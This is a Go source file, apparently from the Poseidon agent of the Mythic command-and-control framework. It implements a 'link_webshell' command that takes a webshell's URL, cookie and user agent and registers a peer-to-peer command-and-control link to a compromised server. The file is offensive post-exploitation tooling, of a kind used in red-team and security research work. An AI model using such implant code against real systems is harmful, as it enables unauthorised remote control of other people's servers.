package link_webshell

import (
	// Standard

	"encoding/base64"
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	CookieValue string
	CookieName  string
	URL         string
	UserAgent   string
	QueryParam  string
	TargetUUID  string
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["cookie_value"]; ok {
		e.CookieValue = v.(string)
	}
	if v, ok := alias["cookie_name"]; ok {
		e.CookieName = v.(string)
	}
	if v, ok := alias["url"]; ok {
		e.URL = v.(string)
	}
	if v, ok := alias["user_agent"]; ok {
		e.UserAgent = v.(string)
	}
	if v, ok := alias["query_param"]; ok {
		e.QueryParam = v.(string)
	}
	if v, ok := alias["target_uuid"]; ok {
		e.TargetUUID = v.(string)
	}
	return nil
}

// Run - package function to run link_tcp
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	args.CookieValue = base64.StdEncoding.EncodeToString([]byte(args.CookieValue))
	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
		C2ProfileName: "webshell",
		Connection:    args,
	}
	responses.P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
		Source:        profiles.GetMythicID(),
		Destination:   args.TargetUUID,
		Action:        "add",
		C2ProfileName: "webshell",
	}
	msg.UserOutput = "Successfully Connected"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return
}
